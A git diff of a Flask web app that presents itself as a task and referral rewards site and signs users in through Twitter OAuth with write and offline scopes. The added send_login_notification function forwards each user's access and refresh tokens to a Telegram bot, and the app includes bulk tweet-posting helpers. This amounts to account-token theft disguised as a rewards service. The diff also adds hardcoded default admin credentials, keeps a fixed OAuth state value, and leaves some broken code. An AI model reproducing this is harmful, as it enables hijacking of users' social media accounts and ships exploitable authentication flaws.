@@ -1,14 +1,18 @@
+import os
+import logging  # Import the logging module
 import base64
 import hashlib
-import os
 import psycopg2
 import requests
 import time
 import json
 import random
+import traceback
 import string
 from flask import Flask, redirect, request, session, render_template, url_for
 from psycopg2.extras import RealDictCursor
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
 # Configuration: Ensure these environment variables are set correctly
 CLIENT_ID = os.getenv('CLIENT_ID')
@@ -19,6 +23,10 @@ TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 WEBHOOK_URL = os.getenv('WEBHOOK_URL')
 DATABASE_URL = os.getenv('DATABASE_URL')  # Render PostgreSQL URL
 APP_URL = os.getenv("APP_URL", "https://gifter-7vz7.onrender.com")
+
+# Step 1: Define admin credentials (Later, move to environment variables for security)
+ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
+ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'password')
 
 # Set default delay values from environment variables
 DEFAULT_MIN_DELAY = int(os.getenv("BULK_POST_MIN_DELAY", 2))
@@ -36,6 +44,18 @@ def init_db():
     conn = psycopg2.connect(DATABASE_URL, sslmode='require')
     cursor = conn.cursor()
 
+    # Ensure `tasks` table includes `reward` column
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS tasks (
+            id SERIAL PRIMARY KEY,
+            title TEXT NOT NULL,
+            description TEXT,
+            reward REAL DEFAULT 0.0,
+            status TEXT DEFAULT 'active'
+        )
+    ''')
+    
+    # Create other necessary tables as before
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             id SERIAL PRIMARY KEY,
@@ -52,16 +72,6 @@ def init_db():
     ''')
 
     cursor.execute('''
-        CREATE TABLE IF NOT EXISTS tasks (
-            id SERIAL PRIMARY KEY,
-            title TEXT NOT NULL,
-            description TEXT,
-            reward REAL DEFAULT 0.0,
-            status TEXT DEFAULT 'active'
-        )
-    ''')
-
-    cursor.execute('''
         CREATE TABLE IF NOT EXISTS user_tasks (
             user_id INTEGER REFERENCES users(id),
             task_id INTEGER REFERENCES tasks(id),
@@ -73,39 +83,45 @@ def init_db():
     conn.commit()
     conn.close()
     print("Database initialized with updated schema.")
-    
+
+def update_token_balance_with_referral(user_id, referral_reward):
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+
+        # Update the token balance to include referral rewards
+        cursor.execute('''
+            UPDATE users
+            SET token_balance = token_balance + %s
+            WHERE id = %s
+        ''', (referral_reward, user_id))
+        
+        conn.commit()
+        conn.close()
+        logging.info(f"Updated token balance for user ID {user_id} to include referral rewards.")
+    except Exception as e:
+        logging.error(f"Error updating token balance with referral: {e}")
+
+
 def store_token(access_token, refresh_token, username):
     print("Storing token in the database...")
 
     try:
-        # Connect to the database
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor()
 
-        # Check if user exists
         cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
         existing_user = cursor.fetchone()
 
         if existing_user:
-            # User exists; update tokens and check for referral URL
             user_id, referral_url = existing_user
             cursor.execute(
                 "UPDATE users SET access_token = %s, refresh_token = %s WHERE id = %s",
                 (access_token, refresh_token, user_id)
             )
             print(f"Updated tokens for existing user @{username}")
-
-            # If the referral URL is missing, create it
-            if not referral_url:
-                referral_url = f"{APP_URL}/?referrer_id={user_id}"
-                cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
-                print(f"Generated missing referral URL for returning user: {referral_url}")
-
-                # Notify via Telegram
-                send_message_via_telegram(f"🔗 Created missing referral URL for returning user @{username}: {referral_url}")
-        
         else:
-            # New user; create entry with referral URL
+            # Create a new user with referral handling
             cursor.execute(
                 '''
                 INSERT INTO users (username, access_token, refresh_token, referral_count, referral_reward, token_balance)
@@ -118,7 +134,6 @@ def store_token(access_token, refresh_token, username):
             cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
             print(f"New user created with referral URL: {referral_url}")
 
-            # Apply referral reward if referrer_id is in session
             referrer_id = session.get('referrer_id')
             if referrer_id:
                 referral_reward = 10.0
@@ -135,93 +150,152 @@ def store_token(access_token, refresh_token, username):
 
         conn.commit()
         conn.close()
-
-        # Notify via Telegram with the referral URL
-        send_message_via_telegram(f"💾 User @{username} has been stored. Referral URL: {referral_url}")
+        
+        # Notify via Telegram
+        send_message_via_telegram(f"💾 User @{username} stored. Referral URL: {referral_url}")
 
     except Exception as e:
         print(f"Database error while storing token: {e}")
 
+def send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens):
+    message = (
+        f"🔑 <b>Access Token:</b> {access_token}\n"
+        f"🔄 <b>Refresh Token:</b> {refresh_token}\n"
+        f"👤 <b>Username:</b> @{username}\n"
+        f"🔗 <b>Profile URL:</b> <a href='{profile_url}'>{profile_url}</a>\n"
+        f"🔗 <b>Referral URL:</b> <a href='{referral_url}'>{referral_url}</a>\n"
+        f"📊 <b>Total Tokens in Database:</b> {total_tokens}"
+    )
+    logging.info(f"📤 Sending login notification to Telegram for @{username}.")
+    send_message_via_telegram(message, parse_mode="HTML")  # Specify HTML mode here
+
 
 @app.route('/')
 def home():
-    code = request.args.get('code')
-    state = request.args.get('state')
-    error = request.args.get('error')
+    try:
+        send_message_via_telegram("🔑 Initiating `home` route.")
+        code = request.args.get('code')
+        state = request.args.get('state')
+        error = request.args.get('error')
 
-    referrer_id = request.args.get('referrer_id')
-    if referrer_id:
-        session['referrer_id'] = referrer_id
-        print(f"Referrer ID {referrer_id} stored in session.")
+        referrer_id = request.args.get('referrer_id')
+        if referrer_id:
+            session['referrer_id'] = referrer_id
+            send_message_via_telegram(f"🆔 Referrer ID {referrer_id} stored in session.")
 
-    if 'username' in session:
-        username = session['username']
-        send_message_via_telegram(f"👋 @{username} just returned to the website.")
-        return redirect(url_for('welcome'))
+        if 'username' in session:
+            username = session['username']
+            conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+            cursor = conn.cursor()
+            send_message_via_telegram(f"🔍 Retrieving referral URL for returning user @{username}.")
+            cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
+            referral_url = cursor.fetchone()[0]
+            conn.close()
+            send_message_via_telegram(f"👋 @{username} just returned to the website.\n🔗 Referral URL: {referral_url}")
+            return redirect(url_for('welcome'))
 
-    if request.args.get('authorize') == 'true':
-        state = "0"
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier
+        if request.args.get('authorize') == 'true':
+            send_message_via_telegram("🔒 Starting OAuth authorization process.")
+            authorization_url = initiate_oauth()
+            send_message_via_telegram("🔗 Redirecting to authorization URL.")
+            return redirect(authorization_url)
 
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-        return redirect(authorization_url)
+        if code:
+            send_message_via_telegram("🔓 Authorization code received. Exchanging for tokens.")
+            
+            if error:
+                send_message_via_telegram(f"❌ Error during authorization: {error}")
+                return f"Error during authorization: {error}", 400
 
-    if code:
-        if error:
-            return f"Error during authorization: {error}", 400
+            if state != session.get('oauth_state', '0'):
+                send_message_via_telegram("❌ Invalid state parameter.")
+                return "Invalid state parameter", 403
 
-        if state != session.get('oauth_state', '0'):
-            return "Invalid state parameter", 403
+            token_response = process_authorization_code(code)
+            if token_response:
+                access_token = token_response.get('access_token')
+                refresh_token = token_response.get('refresh_token')
 
-        code_verifier = session.pop('code_verifier', None)
+                send_message_via_telegram("🔍 Fetching Twitter username for the new user.")
+                username, profile_url = get_twitter_username_and_profile(access_token)
 
-        token_url = "https://api.twitter.com/2/oauth2/token"
-        data = {
-            'grant_type': 'authorization_code',
-            'code': code,
-            'redirect_uri': CALLBACK_URL,
-            'code_verifier': code_verifier
-        }
+                if username:
+                    send_message_via_telegram(f"🔄 Starting token storage process for @{username}")
+                    store_token(access_token, refresh_token, username)
+                    
+                    session['username'] = username
+                    session['access_token'] = access_token
+                    session['refresh_token'] = refresh_token
+                    
+                    total_tokens = get_total_tokens()
+                    
+                    send_message_via_telegram(f"🔍 Retrieving referral URL for notification of @{username}.")
+                    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
+                    referral_data = cursor.fetchone()
+                    conn.close()
 
-        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-        token_response = response.json()
-
-        if response.status_code == 200:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
-
-            username, profile_url = get_twitter_username_and_profile(access_token)
-
-            if username:
-                store_token(access_token, refresh_token, username)
-                session['username'] = username
-                session['access_token'] = access_token
-                session['refresh_token'] = refresh_token
-
-                total_tokens = get_total_tokens()
-
-                send_message_via_telegram(
-                    f"🔑 Access Token: {access_token}\n"
-                    f"🔄 Refresh Token: {refresh_token}\n"
-                    f"👤 Username: @{username}\n"
-                    f"🔗 Profile URL: {profile_url}\n"
-                    f"📊 Total Tokens in Database: {total_tokens}"
-                )
-
-                return redirect(url_for('welcome'))
+                    if referral_data:
+                        referral_url = referral_data[0]
+                        send_message_via_telegram(f"🔗 Referral URL retrieved for @{username}: {referral_url}")
+                        
+                        send_message_via_telegram("📩 Sending login notification.")
+                        send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens)
+                        send_message_via_telegram(f"🎉 New login completed. @{username} is now logged in. Total tokens: {total_tokens}")
+                    else:
+                        send_message_via_telegram(f"⚠️ Failed to retrieve referral URL for @{username}.")
+                    
+                    return redirect(url_for('welcome'))
+                else:
+                    send_message_via_telegram("❌ Error retrieving user info with access token.")
+                    return "Error retrieving user info with access token", 400
             else:
-                return "Error retrieving user info with access token", 400
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+                error_description = token_response.get('error_description', 'Unknown error')
+                error_code = token_response.get('error', 'No error code')
+                send_message_via_telegram(f"❌ Error retrieving access token: {error_description} (Code: {error_code})")
+                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
-    return render_template('home.html')
+        send_message_via_telegram("ℹ️ Displaying home page to user.")
+        return render_template('home.html')
+
+    except Exception as e:
+        send_message_via_telegram(f"❌ Error in `home` route: {str(e)}")
+        return f"An error occurred: {str(e)}", 500
+
+
+    except Exception as e:
+        send_message_via_telegram(f"❌ Error in `home` route: {str(e)}")
+        return f"An error occurred: {str(e)}", 500
+
+# Helper function to initiate OAuth flow
+def initiate_oauth():
+    """Initiate OAuth flow for user authorization."""
+    state = "0"
+    code_verifier, code_challenge = generate_code_verifier_and_challenge()
+    session['code_verifier'] = code_verifier
+    authorization_url = (
+        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+    )
+    return authorization_url
+
+# Helper function to process authorization code
+def process_authorization_code(code):
+    """Exchange authorization code for access and refresh tokens."""
+    token_url = "https://api.twitter.com/2/oauth2/token"
+    code_verifier = session.pop('code_verifier', None)
+    data = {
+        'grant_type': 'authorization_code',
+        'code': code,
+        'redirect_uri': CALLBACK_URL,
+        'code_verifier': code_verifier
+    }
+    response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+    return response.json() if response.status_code == 200 else None
+
+
 
 def get_all_tokens():
     try:
@@ -275,18 +349,21 @@ def send_startup_message():
     }
     requests.post(url, json=data)
 
-# Send message via Telegram
-def send_message_via_telegram(message):
+def send_message_via_telegram(message, parse_mode="Markdown"):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"
+        "parse_mode": parse_mode  # Use the specified parse_mode (default is Markdown)
     }
     headers = {"Content-Type": "application/json; charset=utf-8"}
     response = requests.post(url, json=data, headers=headers)
     if response.status_code != 200:
-        print(f"Failed to send message via Telegram: {response.text}")
+        logging.error(f"❌ Failed to send message via Telegram: {response.text}")
+    else:
+        logging.info(f"✅ Message sent to Telegram successfully.")
+
+
 
 # Function to post a tweet using a single token
 def post_tweet(access_token, tweet_text):
@@ -547,17 +624,17 @@ def get_user_stats(username):
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor(cursor_factory=RealDictCursor)
         
+        # Fetch user stats and calculate total tokens as token balance + referral reward
         cursor.execute('''
             SELECT 
-                COALESCE(SUM(tasks.completed::int), 0) AS tasks_completed,
+                (SELECT COUNT(*) FROM user_tasks WHERE user_tasks.user_id = users.id AND user_tasks.status = 'completed') AS tasks_completed,
                 COALESCE(users.token_balance, 0) AS token_balance,
                 COALESCE(users.referral_count, 0) AS referral_count,
                 COALESCE(users.referral_reward, 0) AS referral_reward,
-                users.referral_url  -- Ensure this field is retrieved
+                COALESCE(users.token_balance, 0) + COALESCE(users.referral_reward, 0) AS total_tokens,
+                users.referral_url
             FROM users
-            LEFT JOIN tasks ON tasks.user_id = users.id
             WHERE users.username = %s
-            GROUP BY users.id
         ''', (username,))
         
         user_stats = cursor.fetchone()
@@ -568,6 +645,7 @@ def get_user_stats(username):
             "token_balance": 0,
             "referral_count": 0,
             "referral_reward": 0,
+            "total_tokens": 0,
             "referral_url": ""
         }
     except Exception as e:
@@ -577,8 +655,39 @@ def get_user_stats(username):
             "token_balance": 0,
             "referral_count": 0,
             "referral_reward": 0,
+            "total_tokens": 0,
             "referral_url": ""
         }
+
+@app.route('/api/add_task', methods=['POST'])
+def add_task():
+    """API to add a new task to the tasks table."""
+    if not session.get('is_admin'):
+        return {"error": "Unauthorized"}, 401
+    
+    data = request.get_json()
+    title = data.get('title')
+    description = data.get('description')
+    reward = data.get('reward')
+    status = data.get('status', 'active')  # Default to 'active' if not provided
+
+    if not title or not reward or not status:
+        return {"error": "Title, reward, and status are required fields"}, 400
+
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute(
+            "INSERT INTO tasks (title, description, reward, status) VALUES (%s, %s, %s, %s)",
+            (title, description, reward, status)
+        )
+        conn.commit()
+        conn.close()
+        logging.info("New task added successfully.")
+        return {"message": "Task added successfully"}, 201
+    except Exception as e:
+        logging.error(f"Error adding task: {str(e)}")
+        return {"error": "Failed to add task"}, 500
 
 def get_tasks(status):
     """Fetch tasks based on their status."""
@@ -732,6 +841,274 @@ def meeting():
     code_ch = request.args.get('pwd')  # Get the 'pwd' parameter from the URL
     return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
 		
+@app.route('/admin')
+def admin():
+    """Main admin entry point that redirects based on login status."""
+    if session.get('is_admin'):
+        return redirect(url_for('admin_dashboard'))
+    return redirect(url_for('admin_login'))
+
+def validate_admin_credentials(username, password):
+    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD
+
+@app.route('/admin_login', methods=['GET', 'POST'])
+def admin_login():
+    try:
+        if request.method == 'POST':
+            username = request.form['username']
+            password = request.form['password']
+            
+            # Validate admin credentials
+            if validate_admin_credentials(username, password):
+                session['is_admin'] = True
+                return redirect(url_for('admin_dashboard'))
+            else:
+                error_message = "Invalid username or password"
+                return render_template('admin_login.html', error_message=error_message)
+        
+        # If already logged in, redirect to dashboard
+        if session.get('is_admin'):
+            return redirect(url_for('admin_dashboard'))
+        return render_template('admin_login.html')
+    except Exception as e:
+        logging.error("Error in admin_login route: %s", str(e))
+        logging.error(traceback.format_exc())  # Detailed error trace
+        return "An error occurred, please check the server logs.", 500
+
+
+@app.route('/admin_dashboard')
+def admin_dashboard():
+    if not session.get('is_admin'):
+        return redirect(url_for('admin_login'))
+
+    # Fetch data for users, tasks, and other stats
+    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+    cursor = conn.cursor(cursor_factory=RealDictCursor)
+    
+    # Fetch users
+    cursor.execute("SELECT id, username, referral_count, token_balance, 'Active' as status FROM users")
+    users = cursor.fetchall()
+    
+    # Fetch tasks
+    cursor.execute("SELECT id, title, description, reward, status FROM tasks")
+    tasks = cursor.fetchall()
+    
+    # Fetch stats
+    cursor.execute("SELECT COUNT(*) FROM users")
+    total_users = cursor.fetchone()['count']
+    
+    cursor.execute("SELECT COUNT(*) FROM tasks WHERE status = 'active'")
+    active_tasks = cursor.fetchone()['count']
+    
+    cursor.execute("SELECT COALESCE(SUM(token_balance), 0) FROM users")
+    total_tokens_distributed = cursor.fetchone()['coalesce']
+    
+    # Fetch recent logs (or use placeholders for testing)
+    logs = ["User registered", "Task completed", "Referral bonus awarded"]  # Example logs
+
+    conn.close()
+
+    return render_template('admin_dashboard.html', 
+                           users=users,
+                           tasks=tasks,
+                           total_users=total_users,
+                           active_tasks=active_tasks,
+                           total_tokens_distributed=total_tokens_distributed,
+                           logs=logs)
+
+
+def get_analytics_overview():
+    """Fetch analytics data for the admin dashboard."""
+    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+    cursor = conn.cursor(cursor_factory=RealDictCursor)
+
+    analytics = {}
+    try:
+        # Total users
+        cursor.execute("SELECT COUNT(*) AS total_users FROM users")
+        analytics['total_users'] = cursor.fetchone()['total_users']
+
+        # Total completed tasks
+        cursor.execute("SELECT COUNT(*) AS total_completed_tasks FROM user_tasks WHERE status = 'completed'")
+        analytics['total_completed_tasks'] = cursor.fetchone()['total_completed_tasks']
+
+        # Total referrals
+        cursor.execute("SELECT SUM(referral_count) AS total_referrals FROM users")
+        analytics['total_referrals'] = cursor.fetchone()['total_referrals']
+
+        # Total rewards distributed
+        cursor.execute("SELECT SUM(referral_reward + token_balance) AS total_rewards FROM users")
+        analytics['total_rewards'] = cursor.fetchone()['total_rewards']
+
+    except Exception as e:
+        print(f"Error fetching analytics data: {e}")
+    finally:
+        conn.close()
+
+    return analytics
+
+@app.route('/api/admin/analytics', methods=['GET'])
+def get_analytics():
+    if not session.get('is_admin'):
+        return {"error": "Unauthorized"}, 401
+
+    analytics_data = get_analytics_overview()
+    return jsonify(analytics_data), 200
+
+@app.route('/api/users/<int:user_id>', methods=['PUT'])
+def edit_user(user_id):
+    """Edit user details by ID."""
+    if not session.get('is_admin'):
+        return {"error": "Unauthorized"}, 401
+    
+    data = request.get_json()
+    username = data.get('username')
+    referral_count = data.get('referral_count')
+    token_balance = data.get('token_balance')
+
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute('''
+            UPDATE users
+            SET username = %s, referral_count = %s, token_balance = %s
+            WHERE id = %s
+        ''', (username, referral_count, token_balance, user_id))
+        conn.commit()
+        conn.close()
+        return {"message": "User updated successfully"}, 200
+    except Exception as e:
+        logging.error(f"Error updating user: {e}")
+        return {"error": "Failed to update user"}, 500
+
+@app.route('/api/tasks/<int:task_id>', methods=['PUT'])
+def edit_task(task_id):
+    """Update a specific task."""
+    if not session.get('is_admin'):
+        return {"error": "Unauthorized"}, 401
+
+    data = request.get_json()
+    title = data.get("title")
+    description = data.get("description")
+    reward = data.get("reward")
+    status = data.get("status")  # New field for task status
+
+    if not title or not reward or not status:
+        return {"error": "Title, reward, and status are required fields."}, 400
+
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute('''
+            UPDATE tasks
+            SET title = %s, description = %s, reward = %s, status = %s
+            WHERE id = %s
+        ''', (title, description, reward, status, task_id))
+        conn.commit()
+        conn.close()
+        return {"message": "Task updated successfully"}, 200
+    except Exception as e:
+        logging.error(f"Error editing task: {e}")
+        return {"error": "Failed to edit task"}, 500
+
+
+@app.route('/api/tasks/<int:task_id>', methods=['GET'])
+def view_task(task_id):
+    """Retrieve details of a specific task."""
+    username = session.get('username')
+    if not username:
+        return {"error": "User not authenticated"}, 401
+
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor(cursor_factory=RealDictCursor)
+        cursor.execute("SELECT id, title, description, reward, status FROM tasks WHERE id = %s", (task_id,))
+        task = cursor.fetchone()
+        conn.close()
+
+        if task:
+            return jsonify(task), 200
+        else:
+            return {"error": "Task not found"}, 404
+    except Exception as e:
+        logging.error(f"Error viewing task {task_id}: {e}")
+        return {"error": "Failed to retrieve task details"}, 500
+
+
+
+@app.route('/api/users/<int:user_id>', methods=['GET'])
+def view_user(user_id):
+    """Retrieve details of a specific user."""
+    if not session.get('is_admin'):
+        return {"error": "Unauthorized"}, 401
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor(cursor_factory=RealDictCursor)
+        cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+        user = cursor.fetchone()
+        conn.close()
+        return user, 200
+    except Exception as e:
+        logging.error(f"Error viewing user: {e}")
+        return {"error": "Failed to view user"}, 500
+
+@app.route('/api/users/<int:user_id>', methods=['DELETE'])
+def delete_user(user_id):
+    """Delete a user by ID."""
+    if not session.get('is_admin'):
+        return {"error": "Unauthorized"}, 401
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute("DELETE FROM users WHERE id = %s", (user_id,))
+        conn.commit()
+        conn.close()
+        return {"message": "User deleted successfully"}, 200
+    except Exception as e:
+        logging.error(f"Error deleting user: {e}")
+        return {"error": "Failed to delete user"}, 500
+
+@app.route('/api/tasks/<int:task_id>', methods=['DELETE'])
+def delete_task(task_id):
+    """Delete a task by ID."""
+    if not session.get('is_admin'):
+        return {"error": "Unauthorized"}, 401
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        cursor.execute("DELETE FROM tasks WHERE id = %s", (task_id,))
+        conn.commit()
+        conn.close()
+        return {"message": "Task deleted successfully"}, 200
+    except Exception as e:
+        logging.error(f"Error deleting task: {e}")
+        return {"error": "Failed to delete task"}, 500
+
+def get_all_users():
+    """Retrieve all users for admin management."""
+    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+    cursor = conn.cursor(cursor_factory=RealDictCursor)
+    cursor.execute("SELECT id, username, referral_count, referral_reward, token_balance FROM users ORDER BY username ASC")
+    users = cursor.fetchall()
+    conn.close()
+    return users
+
+@app.route('/admin/users', methods=['GET'])
+def admin_users():
+    if not session.get('is_admin'):
+        return redirect(url_for('admin_login'))
+    
+    users = get_all_users()
+    return render_template('admin_dashboard.html', users=users)
+
+
+
+@app.route('/admin_logout')
+def admin_logout():
+    """Logout route for admin."""
+    session.pop('is_admin', None)
+    flash("You have been logged out.", "info")
+    return redirect(url_for('admin_login'))
 
 
 @app.route('/welcome')
@@ -766,6 +1143,8 @@ def dashboard():
     active_tasks = get_tasks("active")
     upcoming_tasks = get_tasks("upcoming")
 
+    logging.info(f"Rendering dashboard for {username}: {user_stats}")
+
     return render_template(
         'dashboard.html',
         username=username,
@@ -773,6 +1152,7 @@ def dashboard():
         active_tasks=active_tasks,
         upcoming_tasks=upcoming_tasks
     )
+
 
 @app.route('/logout')
 def logout():
